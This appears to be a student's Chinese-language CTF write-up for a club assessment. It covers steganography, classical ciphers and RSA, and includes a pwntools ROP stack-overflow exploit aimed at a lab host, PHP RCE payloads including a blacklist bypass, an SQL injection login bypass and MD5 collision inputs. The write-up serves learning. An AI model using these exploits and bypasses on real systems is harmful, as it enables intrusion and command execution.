---
title: Dozer第一次考核
date: 2023-10-28 20:00:10
cover: /illust_99248298_20220722_142026.jpg
tags: 做题记录
---
# Dozer第一次考核

## MISC

### 1.morse_code

![image-20231003131226358](Dozer第一次考核/image-20231003131226358.png)

本题可以不用工具，我用到的工具是Audacity

将题目给的文件用工具打开，得到的是这样的图片：

![image-20231003130424024](Dozer第一次考核/image-20231003130424024.png)

我们如果听的话，联系题目会发现这是一段摩斯电码：

我们把长的作为`-`，短的作为`.`，可以得到这样的一串密码：

`-- ----- .-. ..... ...-- ..--.- .---- ..... ..--.- ...- ...-- .-. -.-- ..--.- . ....- ... -.--`

在网站找到在线摩斯密码翻译器进行翻译

![image-20231003130635315](Dozer第一次考核/image-20231003130635315.png)

![image-20231003130824093](Dozer第一次考核/image-20231003130824093.png)

套上flag头，就得到了本题的flag：`Dozer{m0r53_15_v3ry_e4sy}`

或者`Dozer{M0R53_15_V3RY_E4SY}`，鉴于不同的在线翻译器翻译出来的字母大小写不一样，我们都试一遍就行。

### 2.签到

![image-20231003130955448](Dozer第一次考核/image-20231003130955448.png)

本题最简单，直接关注公众号发送消息即可得到flag：`Dozer{Hello_CTFer_Welcome_to_Dozer}`。

### 3.开心的picture

本题柚子厨狂喜，下载后得到的是一个绫地宁宁的jpg文件，我先以为是图片隐写，用WinHex改了一波长宽后没有用，随后想到了用kali进行binwalk分离，先将图片拖到kali虚拟机桌面，输入binwalk指令：

![image-20231003131721392](Dozer第一次考核/image-20231003131721392.png)

可以得到一个文件夹，一路点下去：

![image-20231003131909103](Dozer第一次考核/image-20231003131909103.png)

这个密码是所以柚子厨都知道的：`0721`

![image-20231003132017519](Dozer第一次考核/image-20231003132017519.png)

然后就得到了flag：`Dozer{W0_caI_Bu_Sh1_y1u_zi_cHu}`。

### 4.破碎的二维码

![image-20231003132122574](Dozer第一次考核/image-20231003132122574.png)

本题下载下来是这样的一堆图片，我比较笨，没想出来怎么做，直接硬拼出来了。

![image-20231003132151817](Dozer第一次考核/image-20231003132151817.png)

<img src="Dozer第一次考核/image-20231003132255985.png" alt="image-20231003132255985" style="zoom:67%;" />

用wps的ppt拼了一个二维码出来，用微信扫一下就得到了flag：

`Dozer{ReverseAnyway_ReverseAgain}`。

### 5.normal_zip

<img src="Dozer第一次考核/image-20231012004413673.png" alt="image-20231012004413673"  />

上网搜了一下，这种题一般是3个方法，1. 分析16进制文件找到最后一个文件的文件头和文件未。2.利用文件每次都递减1的规律跑脚本。3.自己手动一个个点，我用010editer分析了一下发现不能直接找到最后一个压缩包，那就得尝试跑脚本了，上网搜了半天，没有合适的脚本，尝试用gpt生成，搞出来的也用不了，最后只能自己手搓。

![image-20231012004827233](Dozer第一次考核/image-20231012004827233.png)

flag为：`Dozer{th15_z1p_s33ms_t00_much}`。

### 6.Steg and CRC

![image-20231012005241978](Dozer第一次考核/image-20231012005241978.png)

这题主要考察了steghead这个工具的使用，和修复图片CRC的脚本使用。

题目附件下载下来是这些东西，其中douzi这个压缩包需要密码才能得到`douzi.png`这张图片。

![image-20231012010509761](Dozer第一次考核/image-20231012010509761.png)

先使用``steghide info guimie.jpg ``这条指令看看图片里面是不是藏了东西，找到一个secret.txt。

![image-20231012005807731](Dozer第一次考核/image-20231012005807731.png)

要把这个txt文件提取出来，那就输入``steghide extract -sf guimie.jpg ``，得到文件。![image-20231012010154183](Dozer第一次考核/image-20231012010154183.png)

打开是压缩包的密码：`YuGod2023!@#`![image-20231012010242917](Dozer第一次考核/image-20231012010242917.png)

我们就可以打开`douzi.png`了，得到的是这样的一张奇怪的图片：

![image-20231012010648564](Dozer第一次考核/image-20231012010648564.png)

根据hint所说，这张图片的宽高有问题，那就需要找出正确的宽高，也就是正确的CRC。我使用的是这段脚本：

```py
import binascii
import struct
 
 
 
crcbp = open("douzi.png", "rb").read()    #打开图片
crc32frombp = int(crcbp[29:33].hex(),16)     #读取图片中的CRC校验值
print(crc32frombp)
 
for i in range(4000):                        #宽度1-4000进行枚举
    for j in range(4000):                    #高度1-4000进行枚举
        data = crcbp[12:16] + \
            struct.pack('>i', i)+struct.pack('>i', j)+crcbp[24:29]
        crc32 = binascii.crc32(data) & 0xffffffff
        # print(crc32)
        if(crc32 == crc32frombp):            #计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定
            print(i, j)
            print('hex:', hex(i), hex(j))
            exit(0)
 
```

这样就得到了正确的宽和高：![image-20231012011931804](Dozer第一次考核/image-20231012011931804.png)

在010editer中对douzi.png的宽高进行修改，改为这样：

![image-20231012012306451](Dozer第一次考核/image-20231012012306451.png)

保存，就可以得到可爱的douzi了：

![image-20231012012348222](Dozer第一次考核/image-20231012012348222.png)

flag为：`Dozer{Gu1_MiE_zhl_REN_&CRC_hide_in_steg!}`.

### 7.小新被藏起来了

![image-20231014212641672](Dozer第一次考核/image-20231014212641672.png)

下载下来是一张小新的图片，仔细看看图片的宽高好像不对：

![image-20231014213103940](Dozer第一次考核/image-20231014213103940.png)

本来是用脚本跑的，现在有了工具，直接一把梭：

![image-20231014213329973](Dozer第一次考核/image-20231014213329973.png)

得到flag：`Dozer{Xia0_x1n_1s_cuTe}`。

### 8.充满禅意的嘲讽

![image-20231014215459449](Dozer第一次考核/image-20231014215459449.png)

题目附件打开是这样的一段文字：

![image-20231014221206015](Dozer第一次考核/image-20231014221206015.png)

直接傻掉，根本没见过这样的加密方式。我在网上搜了好几天，将正经编码方式翻遍了，也没翻到这个是什么加密，突然意识到，常规加密没有，那难道是特殊加密方式？去搜索，成功搜出是**阴阳怪气加密**，直接在线解密：

![image-20231014221500048](Dozer第一次考核/image-20231014221500048.png)

得到一串佛语，可以得知是与佛论禅加密方式。但是与佛论禅因为网上有好几个网址，每个都有点区别，所以只有找到当初进行加密的那个网址才能成功解密，最终找到了，本题用的是**与佛论禅加密版**这个网站：

![image-20231014221830799](Dozer第一次考核/image-20231014221830799.png)

得到flag：`Dozer{We1lc0me_t0_D0zer}`。

### 9.云天明的故事

![image-20231014222242338](Dozer第一次考核/image-20231014222242338.png)

本题主要考察了各种加密方式，重点在于有没有耐心去做，做起来也是十分的有趣。

首先题目下载下来就是一个word文档，打开一看：

![image-20231014222622585](Dozer第一次考核/image-20231014222622585.png)

怎么什么都没有？？上网一搜，有三种可能：1.文档中所有文字被调成了白色、2.文档中所有文字被隐藏了、3.word文件本质是一个zip压缩文件，可以通过改后缀用解压工具打开。

先检查是不是前两点，在文档中按`cirl+a`选中全部文本，更改字体，发现文字被隐藏了，同时字体颜色为白色：

![image-20231014223604888](Dozer第一次考核/image-20231014223604888.png)

还原，发现一大段废话文学：

![image-20231014223732384](Dozer第一次考核/image-20231014223732384.png)

注意这个，这玩意乍一看像是flag，但不是，我一开始还傻傻的提交，交不上去QAQ。说明前两点都不对，那我们尝试第三点，更改后缀、用解压文件打开：

![image-20231014223927059](Dozer第一次考核/image-20231014223927059.png)

打开在word文件夹中找到了：`don't open it please`，打开它，我们才正式开始做这题。

注意，这边还有一个假的flag：

![image-20231014224251343](Dozer第一次考核/image-20231014224251343.png)

   我当时也是傻傻的一激动，直接提交，然后不对才发现这个写着的就叫**别提交是假的** QwQ。一路开文件，找到四个场景，每个场景都有对应的解密，解开就可以得到钥匙，不同的钥匙对应的是不同的加密文件，挨个解开我们就能得到flag，开始解密！  

遇到场景二中**启动不了一点.txt**这个文件：                        

![image-20231014224814582](Dozer第一次考核/image-20231014224814582.png)

这个现在熟悉了，就是阴阳怪气编码：

![image-20231014224847908](Dozer第一次考核/image-20231014224847908.png)

得到一个钥匙：`Do@zer001`，根据描述是用来开彩蛋的，先存着。

到第三个场景，找到一个音符编码：

![image-20231014225426474](Dozer第一次考核/image-20231014225426474.png)

解密得到：`ikun来也`，感觉没啥用，先存着。

![image-20231014225459807](Dozer第一次考核/image-20231014225459807.png)

kunkun直接送了我们铁钥匙：`flag_is_true`，这个铁定要用到了。

在场景四中，我们找到了**金苹果的使用方法.txt**，这个文件是加密的，猜测要用铁钥匙开，开不了。这时看到一个叫做**有缘人.txt**的文件，打开发现是ook加密：

![image-20231014230026579](Dozer第一次考核/image-20231014230026579.png)

解密得到：`D@z123`，那估计是这个来开锁了。

![image-20231014230112537](Dozer第一次考核/image-20231014230112537.png)

果然是！但开出来的没有任何价值UwU。

![image-20231014230154056](Dozer第一次考核/image-20231014230154056.png)

打开金钥匙的图片：

![image-20231014230310333](Dozer第一次考核/image-20231014230310333.png)

看着有点像猪圈密码，但不对，发现是猪圈密码的变种——银河密码

![image-20231014230507667](Dozer第一次考核/image-20231014230507667.png)

解密出金钥匙是：`dozer`，但考虑到可能存在格式问题，先用小写记录。

下面我们到了银钥匙所在处，看到有个**蜂蜜地点.txt**文件，打开：

![image-20231014230804133](Dozer第一次考核/image-20231014230804133.png)

这个和与佛论禅很像，是与熊论道加密：

![image-20231014230856130](Dozer第一次考核/image-20231014230856130.png)

得到蜂蜜地点：`光头强的林中小屋`

![image-20231014230953004](Dozer第一次考核/image-20231014230953004.png)

成功得到银钥匙：`Eazy_FLAG_`，存起来。

下面到了场景五，在最后有一个神秘宝箱，但是目前我们得到的没有一个能打开，说明还没有得到对应的钥匙，先往下走。

最后是场景一，开到最后有一个**佛.txt**文件，打开是与佛论禅加密：

![image-20231014231317740](Dozer第一次考核/image-20231014231317740.png)

这个与佛论禅加密的网站是：

![image-20231014231404011](Dozer第一次考核/image-20231014231404011.png)

解密得到：`admin`，这下就能知道老和尚要说啥了。

![image-20231014231500387](Dozer第一次考核/image-20231014231500387.png)

告诉我们要用藏宝图和彩蛋来找到最终的flag，还记得之前的启动给的钥匙吗，直接去开彩蛋：

![image-20231014231741267](Dozer第一次考核/image-20231014231741267.png)

![image-20231014231834662](Dozer第一次考核/image-20231014231834662.png)

告诉了我们彩钥匙的合成方式：`彩=金+银+铁`，同时也告诉了我们真正的flag就藏在宝箱之中，那么彩钥匙应该就是：`dozerEazy_FLAG_flag_is_true`，拿去开宝箱喽！

![image-20231014232033072](Dozer第一次考核/image-20231014232033072.png)

这就是最终的flag：`Dozer{Good_You_Find_Me}`。

附上本题存下来的所有解密得到的消息：

```
原神启动：Do@zer001
music：ikun来也
铁钥匙：flag_is_true
有缘人：D@z123 
金苹果的使用方法：吃！可以恢复体力！∧＿∧
金钥匙 银河密码：dozer
蜂蜜地点：光头强的林中小屋
熊二给的银钥匙：Eazy_FLAG_
佛曰：admin
老和尚说：flag  被大魔王存放到了一个藏宝图中 你需要借助彩蛋的力量才能找到它
彩：dozerEazy_FLAG_flag_is_true
宝箱flag：Dozer{Good_You_Find_Me}
```

PS:本题的解答过程还是很快乐的，虽然比较烦，但真的很好玩。

## CRYPTO

### 1.base_family

![image-20231003132503977](C:\Users\48956\AppData\Roaming\Typora\typora-user-images\image-20231003132503977.png)

本题下载下来得到的是这个文件，联系到题目和文件内容，可以猜到是base编码。

![image-20231003132519979](C:\Users\48956\AppData\Roaming\Typora\typora-user-images\image-20231003132519979.png)

利用在线的base解码工具挨个试一遍，发现顺序是base16、base32、base64。

![image-20231003132723831](C:\Users\48956\AppData\Roaming\Typora\typora-user-images\image-20231003132723831.png)

![image-20231003132743002](C:\Users\48956\AppData\Roaming\Typora\typora-user-images\image-20231003132743002.png)

```
Dozer{Y0u_knOw_base_Fami1y}
```

最终得到flag：`Dozer{Y0u_knOw_base_Fami1y}`

### 2.keyboard

![image-20231003133752594](C:\Users\48956\AppData\Roaming\Typora\typora-user-images\image-20231003133752594.png)

本题的谜底就藏在大家的键盘上，根据键盘上的按键进行解密，给解密出来的答案套上flag头，我们就可以得到flag了。

![image-20231003134025396](C:\Users\48956\AppData\Roaming\Typora\typora-user-images\image-20231003134025396.png)

flag为：`Dozer{keyboardisfun}`。

### 3.你吃饭了吗

![image-20231003134235364](C:\Users\48956\AppData\Roaming\Typora\typora-user-images\image-20231003134235364.png)

这顿饭吃了大半天，直到晚上才吃出来。

![image-20231003134334352](C:\Users\48956\AppData\Roaming\Typora\typora-user-images\image-20231003134334352.png)

这段乱码让人猜不透啥意思，一开始以为二进制转换，后来发现不对，一直想到晚上吃完饭，意识到题目里给的提示。上网搜各种密码，发现有一个培根密码，那这题估计就是培根密码。

我们把`10000`当作`A`，把`00000`当作`B`，将这段乱码翻译过来就是：`AABBBAABAAABABBABABBABBBAAAABABAAABBBAAAABBBBBAABBABBBA`

拿到网上的培根密码在线翻译器翻译：

![image-20231003134803585](C:\Users\48956\AppData\Roaming\Typora\typora-user-images\image-20231003134803585.png)

但得到的答案套上flag头发现不对，后来发现flag是全大写QwQ。

本题的flag为：`Dozer{HELLOCRTPTO}`。

### 4.爱莉的秘密

![image-20231003135004688](C:\Users\48956\AppData\Roaming\Typora\typora-user-images\image-20231003135004688.png)

本题是我手慢了，还有一部分是在线翻译网站的问题，没能拿到一血。

![image-20231003135059997](C:\Users\48956\AppData\Roaming\Typora\typora-user-images\image-20231003135059997.png)

注意这段话，给了三个提示：**凯撒5世**、**2个栅栏**、**回转13年**

分别对应着**凯撒密码位移5**、**栅栏密码字数2**、**ROT13**

![image-20231003135426469](C:\Users\48956\AppData\Roaming\Typora\typora-user-images\image-20231003135426469.png)

![image-20231003135443823](C:\Users\48956\AppData\Roaming\Typora\typora-user-images\image-20231003135443823.png)

![image-20231003135520997](C:\Users\48956\AppData\Roaming\Typora\typora-user-images\image-20231003135520997.png)

最终得到flag：`Dozer{kFc_viv0_5o}`。

### 5.esay_rsa

![;](Dozer第一次考核/image-20231012013317106.png)

这题考察的是rsa算法，要用脚本解密。

```py
from Crypto.Util.number import getPrime, bytes_to_long
with open("flag.txt","rb") as f:
    flag = f.read().strip()

m = bytes_to_long(flag)
p = getPrime(1024)
q = getPrime(1024)
e = 65537
n = p * q
c = pow(m, e, n)
print("p =", p)
print("q =", q)
print("e =", e)
print("n =", n)
print("c =", c)

# p = 134096351641873733136655136258930346068666059727369503282043358355700127445567145015864534393648722390354391864886220859764835960001384898109024177275632112341866578728402687911008617032055729760873500316750429826070955961883087776809018398637916325085984289076923243657957898725206939956833810785599676729081
# q = 174103184868040863643318748725372782590375980254481106844909104639082212404057463322179700704433290948772456739103162440357371611490518612697711739090944270430948454322201815911126010072979510574940873419522755545296895048058252502599021139498869173058848513456305201212185556602542021019786049803486761575619
# e = 65537
# n = 23346601900034957555688205728495241197603710402649144851787338023529721742194127312047817399657806766767609016899148890792321953032265424697519828450283061929215380561118334803838533435756788037558393172185799965795876666508514498912225616313132295758111963327975946691723015094769391915622723746219695635703244442263293688623076006730992652392943763278634358911926029815126546840504505510331787504021704653483109395844912490151355318632539550539120625649870737699418228432053253123075546330645737636906674371251100640653395805629579624694238594583468588747282098538736123706732879326510925267827419261467515757876139
# c = 21059425587138275177851133719489520191806374210483381046129196548327926882726571104652182980009173089102114951221766632805478392995791154212734039464866621083806832531787252690774774079642174403366738764142141333611676848288053968926219012504301602753768504662298743543510989548687429433750042177449318246891000022681153221275734518915972309438820282840114939223344564087181810107485654527166576224292423298530128805470851466693656140130112962076400703900223613390342448935776739787297327454611230862799071044833028841126247371401388582818660833906604610436650137961239491977984238538541018508899164870408658111225592

```

我用的是b站上的轩禹ctf的rsa工具做的，将对应的数据放进去就能算出来：

![image-20231012013807138](Dozer第一次考核/image-20231012013807138.png)

得到flag为：`Dozer{02d09a792bcfb825f4547360dfde02ca}`。

### 6.Fuck

![image-20231012012623046](Dozer第一次考核/image-20231012012623046.png)

题目附件下载下来是这样的编码;

![image-20231012012803204](Dozer第一次考核/image-20231012012803204.png)

看不懂是啥，但根据题目的提示，去搜索fuck加密，就找到了：

![image-20231012012908082](Dozer第一次考核/image-20231012012908082.png)

先使用Brainfuck解密：得到![image-20231012013021426](Dozer第一次考核/image-20231012013021426.png)

将下面的再拿去JSfuck解密：

![image-20231012013104059](Dozer第一次考核/image-20231012013104059.png)

就得到本题的flag了，flag为：`Dozer{JSfuck_w1th_Brainfuck_S0_awesome!}`。

### 7.Cloud

![image-20231014151448657](Dozer第一次考核/image-20231014151448657.png)

本题题目叫cloud，那估计加密方式和云有关。下载完附件发现了一个让人哭笑不得的事情：

![image-20231014151650239](Dozer第一次考核/image-20231014151650239.png)

学长不知道是故意的还是不小心，没把flag删掉，可以直接去提交。

正经做法根据提示，应该使用云影密码进行解密:

![image-20231014152209633](Dozer第一次考核/image-20231014152209633.png)

网上的脚本为：

```py
#!/usr/bin/python
# -*- coding=utf8 -*-
"""
# @Author : pig
# @CreatedTime:2019-11-2423:54:02
# @Description : https://www.jianshu.com/p/b5aa5cf60f83
"""


def de_code(c):
    dic = [chr(i) for i in range(ord("A"), ord("Z") + 1)]
    flag = []
    c2 = [i for i in c.split("0")]
    for i in c2:
        c3 = 0
        for j in i:
            c3 += int(j)
        flag.append(dic[c3 - 1])
    return flag

def encode(plaintext):
    dic = [chr(i) for i in range(ord("A"), ord("Z") + 1)]
    m = [i for i in plaintext]
    tmp = [];flag = []
    for i in range(len(m)):
        for j in range(len(dic)):
            if m[i] == dic[j]:
                tmp.append(j + 1)
    for i in tmp:
        res = ""
        if i >= 8:
            res += int(i/8)*"8"
        if i%8 >=4:
            res += int(i%8/4)*"4"
        if i%4 >=2:
            res += int(i%4/2)*"2"
        if i%2 >= 1:
            res += int(i%2/1)*"1"
        flag.append(res + "0")
    print ("".join(flag)[:-1])

c = input("输入要解密的数字串:")
print (de_code(c))
m_code = input("请输入要加密的数字串:")
encode(m_code)
```

直接用就可以进行解密，得到flag：`Dozer{cryptoisinteresting}`。

### 8.Hard_rsa

![image-20231014152447529](Dozer第一次考核/image-20231014152447529.png)

这题同样是rsa解密，附件下载下来是这段代码：

```py
import libnum
import gmpy2
p=libnum.generate_prime(1024)
q=gmpy2.next_prime(p)
e=65537
m="小伙子你猜猜flag是什么"
m=libnum.s2n(m)
n=p*q
phi_n=(p-1)*(q-1)
d=libnum.invmod(e,phi_n)
c=pow(m,e,n)
def shift_encrypt(number):
    encrypted_number = ""
    for digit in str(number):
        shifted_digit = (int(digit) + 3) % 10
        encrypted_number += str(shifted_digit)
    return int(encrypted_number)
C = shift_encrypt(c)
print("n=",n)
print ("e=",e)
print ("c=",c)
print("C=",C)

'''
n= 9902818856222787024563072133440550938710227558135328161789597975061589956056992262033542077154303618976791004431333531566549039602180273711537029693586182757724092450368200557073359408363479337363507885859556647468887536468774671586957716873885078043767796679063965432886918774554067185434296238290330438435760966311141004960151482088020397079850490003346872012237936581379969498669060779635164715522140773054302161538487178356007181001168935521820750705451939658389744968102068056144618223821116178519113949752796472136437303624285646057868957254876748746072125760376198949315110236060132257629082612239437688267817
e= 65537
C= 8482307691494874553560941786879814918288717402317427357225883389833761731401504619647293237879873171678603868643578821231136648132993544500009905512254561590978073904592249500129783556589290931977079200965675232950505317160939048977675863912684406649686171412547992210066028490366602992669474370544262346107062501103027286792412994465910909039679830629738279725975971120223571281240346589660803079243340408679669436774851848324837598148133449279019502562089057417397560447928871642226014539020307390328002204623577052525873728236685688371918079175891866469475256479636776115769825638360982597053023256635103182326101
'''

#小伙子一脸懵逼了吗，一看就没有练rsa的题目，还是小瘪三啊
```

用chatgpt分析了代码，得知要从密文C还原成密文c，只需要将**+3**变为**-3**，那只需要用下面这段代码得到密文c，就可以使用脚本工具进行解密：

```py
import libnum
C=8482307691494874553560941786879814918288717402317427357225883389833761731401504619647293237879873171678603868643578821231136648132993544500009905512254561590978073904592249500129783556589290931977079200965675232950505317160939048977675863912684406649686171412547992210066028490366602992669474370544262346107062501103027286792412994465910909039679830629738279725975971120223571281240346589660803079243340408679669436774851848324837598148133449279019502562089057417397560447928871642226014539020307390328002204623577052525873728236685688371918079175891866469475256479636776115769825638360982597053023256635103182326101
def shift_decrypt(number):
    decrypted_number = ""
    for digit in str(number):
        shifted_digit = (int(digit) - 3) % 10
        decrypted_number += str(shifted_digit)
    return int(decrypted_number)

c = shift_decrypt(C)

print("逆位移解密后的c:", c)
```

![image-20231014153137935](Dozer第一次考核/image-20231014153137935.png)

得到`c=5159074368161541220237618453546581685955484179084194024992550056500438408178271386314960904546540848345370535310245598908803315809660211277776672289921238267645740671269916277896450223256967608644746977632342909627272084837606715644342530689351173316353848189214669987733795167033379669336141047211939013874739278870794953469189661132687676706346507396405946492642648897990248958917013256337570746910017175346336103441528515091504265815800116946786279239756724184064237114695548319993781206797074067095779971390244729292540495903352355048685746842568533136142923146303443882436592305037659264720790923302870859093878`

再用工具一把梭：

![image-20231014153310520](Dozer第一次考核/image-20231014153310520.png)

flag为：`Dozer{20d6e2da95dcc1fa5f5432a436c4be18}`。

## PWN

### 1.nc cat

![image-20231003135850457](Dozer第一次考核/image-20231003135850457.png)

这题其实超简单，但是碍于没看懂nc指令，过了好久才做出来。

这题我用的kali做的，直接两段指令解出：

![image-20231003140115045](Dozer第一次考核/image-20231003140115045.png)

得到本题的flag：`Dozer{ab44a0d5-ed65-5f16-8758-33f4ceeca0fe}`。

### 2.nc_cat_plus

![image-20231003140212186](Dozer第一次考核/image-20231003140212186.png)

这题我想了好久才想出来，为啥找不到，那就是因为flag文件被隐藏了呗，既然是Linux系统，那就去搜如何查看Linux下隐藏文件和显示的方法：

![image-20231003140407925](Dozer第一次考核/image-20231003140407925.png)

搜到了这个，直接去做，这里我用的是Ubuntu，因为我发现它也能输nc指令。![image-20231003140610569](Dozer第一次考核/image-20231003140610569.png)

得到flag：`Dozer{8232fdb0-288c-31b0-86d5-431eba8a3ccb}  `。

### 3.计算题

![image-20231012014046084](Dozer第一次考核/image-20231012014046084.png)

这题我正经方法不会，纯手搓，看了伪代码说只要写50道计算题，开算！

![image-20231012014157604](Dozer第一次考核/image-20231012014157604.png)

得到flag为：`Dozer{e60bd61f-8183-ca0d-ef54-20eca2f5f139}`。

### 4.猜拳

![image-20231012014347394](Dozer第一次考核/image-20231012014347394.png)

正经方法还是不会，查看伪代码发现使用的是伪随机数，直接开搓！

得到的胜利的猜拳方法是：`221200021121222102222212212011111020201202212210021`

![image-20231012014615913](Dozer第一次考核/image-20231012014615913.png)

得到flag为：`Dozer{2c6eacf3-098c-ec1c-d5bd-d637d435dc2e}`。

### 5.猜数字

![image-20231012113058338](Dozer第一次考核/image-20231012113058338.png)

分析代码发现还是伪随机，接着搓：

![image-20231012113219694](Dozer第一次考核/image-20231012113219694.png)

数字是：`21222001110`

flag为：`Dozer{01d8e10e-ceec-83dd-e1c3-a4233dd3b790} `。

### 6.超简单的Stack overflow

![image-20231014201647234](Dozer第一次考核/image-20231014201647234.png)

本题考察的是栈溢出相关知识，需要利用栈溢出控制程序中函数的返回地址，编写一个exp来帮助自己得到计算机的控制权。

我是根据这篇博客编写的我的exp：

![image-20231014202935909](Dozer第一次考核/image-20231014202935909.png)

```py
from pwn import*

p=remote("8.130.87.205",4021)

payload=b'a'*0x78+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)

p.recvuntil("Do you know that the stack overflows\n")

p.sendline(payload)

p.interactive()

```

主要在于该如何找到对应的地址，先用ida来看一下代码：

![image-20231014203445791](Dozer第一次考核/image-20231014203445791.png)

我们要装满栈，那至少需要**0x70**大小的数据，gets函数是一个危险函数，看到它说明题目肯要用到栈溢出，再点击**v4**进去查看：

![image-20231014203834554](Dozer第一次考核/image-20231014203834554.png)

如果我们想要控制函数return的地址，那需要刚好将栈里面的数据堆到这个位置，即`0x70+0x8=0x78`，所以要向栈里面刚好堆入`0x78`的数据。第二步就是找到后门函数（system）![image-20231014204400900](Dozer第一次考核/image-20231014204400900.png)

地址为`0x40073B`，但是这个system函数中并不是`/bin/sh`

![image-20231014204513091](Dozer第一次考核/image-20231014204513091.png)

所以我们还要找到`/bin/sh`字符串的位置：

![image-20231014204647885](Dozer第一次考核/image-20231014204647885.png)

地址为`0x400808`，那现在只差**pop_rdi**的地址了，由于我没能在ida中找到，所以使用了**ROPgadget**进行查找，在安装了ROPgadget的虚拟机中输入`ROPgadget --binary stack | grep "pop rdi"`

![image-20231014205014821](Dozer第一次考核/image-20231014205014821.png)

就得到了pop rdi的地址：`0x4007E3`，最终组合得到：

```py
from pwn import*

p=remote("8.130.87.205",4021)

payload=b'a'*0x78+p64(0x4007E3)+p64(0x400808)+p64(0x40073B)

p.recvuntil("Do you know that the stack overflows\n")

p.sendline(payload)

p.interactive()

```

运行脚本得到控制权限，转为本地控制台进行交互，输入`ls`、`cat flag`就能得到flag了：

![image-20231014205546933](Dozer第一次考核/image-20231014205546933.png)

flag为：`Dozer{2fcf1cbf-dc6f-627e-840a-fda62cbaf43b}`。

## WEB

### 1.game

![image-20231003140757325](Dozer第一次考核/image-20231003140757325.png)

这题我不会正规方法，直接通关游戏拿的flag。

![image-20231003140944402](Dozer第一次考核/image-20231003140944402.png)

flag为：`Dozer{fb271bcadea3491c8fe8b942491ae672}`。

### 2.F12

![image-20231003141215685](Dozer第一次考核/image-20231003141215685.png)

这题我也不知道我怎么按出来的F12，本来显示被禁用，然后一通乱按，给我按出来了。

![image-20231003141254691](Dozer第一次考核/image-20231003141254691.png)

![image-20231003141403443](Dozer第一次考核/image-20231003141403443.png)

按出来之后flag就藏在这里：`Dozer{y0u_4re_mas7er_1n_v1ew_sourc4} `。

### 3.你超逊的啦

![image-20231003141514904](Dozer第一次考核/image-20231003141514904.png)

这题考察的是两种传参的方式，分别是get传参和post传参，我们使用edge自带的控制台就行。

![image-20231003145857289](Dozer第一次考核/image-20231003145857289.png)

注意题目图片中的提示，用get传参`want=flag`，那我们需要输入`/?want=flag`

![image-20231003150315792](Dozer第一次考核/image-20231003150315792.png)

这边则是用post方式进行提交![image-20231003150417660](Dozer第一次考核/image-20231003150417660.png)

![image-20231003150515049](Dozer第一次考核/image-20231003150515049.png)

就得到了本题的flag：`Dozer{77f4c86b315442c6896c35f7855e3c0d}`。

### 4.easy_rce

![image-20231003144249409](Dozer第一次考核/image-20231003144249409.png)

本题主要用了以下两行代码，输入这个就可以得到flag了：

```
/?p=system("ls%20/");
/?p=system("cat%20/flag");
```

![image-20231003144749465](Dozer第一次考核/image-20231003144749465.png)



在网址![image-20231003144814314](Dozer第一次考核/image-20231003144814314.png)看到flag了，再输入第二行代码：

![image-20231003144916441](Dozer第一次考核/image-20231003144916441.png)

就可以得到本题的flag：`Dozer{8f1236f2e9a64352a6f8b4be5445a6cd}`。

### 5.hard_RCE

![image-20231012101118444](Dozer第一次考核/image-20231012101118444.png)

这题打开是这样的页面：

![image-20231012101159491](Dozer第一次考核/image-20231012101159491.png)

可以看到我们要绕过黑名单和正则匹配的过滤字母，过滤之后我们传入的会eval()变成命令来执行。

那首先要传入system(ls /); 即`/?cmd=~(~%8C%86%8C%8B%9A%92)(~%93%8c%df%d0);`

![image-20231012101438771](Dozer第一次考核/image-20231012101438771.png)

看到了flag，那我们现在需要传入cat flag，即`/?cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%D5);`

![image-20231012101711453](Dozer第一次考核/image-20231012101711453.png)

得到flag：`Dozer{e3e319269ad04275af098068ca35f3ca}`。

（本题的两条指令是按照网上的博客改的，脚本当时跑不了）

### 6.管理员登陆

![image-20231012103125320](Dozer第一次考核/image-20231012103125320.png)

这题主要考察的是sql注入，题目进去是这样的：

![image-20231012103232911](Dozer第一次考核/image-20231012103232911.png)

本来我的思路是sql注入进到网站数据库，然后在数据库中更改管理员登录密码，但是没能成功，后来意识到只要我将原来设置的密码注释掉，设置一个永远判断为真的等式，那不就能进去了。在密码位置输入`''or1=1--`。![image-20231012150155043](Dozer第一次考核/image-20231012150155043.png)

就能到这个页面：

![image-20231012150305840](Dozer第一次考核/image-20231012150305840.png)

打开php文件，就得到了flag：`Dozer{352263e93be54999a0969600f135cb58}`。

### 7.Wonderful_pass

![image-20231014145907865](Dozer第一次考核/image-20231014145907865.png)

这道题用的是火狐浏览器做的，用了hackbar插件。

本题进去后是这样的页面：

![image-20231014143706394](Dozer第一次考核/image-20231014143706394.png)

没啥信息，先用爬虫协议看看可以抓取哪些页面，输入`/robots.txt`

![image-20231014143825652](Dozer第一次考核/image-20231014143825652.png)

找到了文件**dozer.php**，这边应该就是做题目需要的了。

![image-20231014143941618](Dozer第一次考核/image-20231014143941618.png)

分析代码得知，我们需要用get传参传入id和login，同时需要通过md5强比较，上网搜到了能够通过md5强比较的值：

```
%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
```
那我们用get传参交上去就可以pass第一层，即提交：

```/?id=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
&login=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2`
```

![image-20231014144542437](Dozer第一次考核/image-20231014144542437.png)

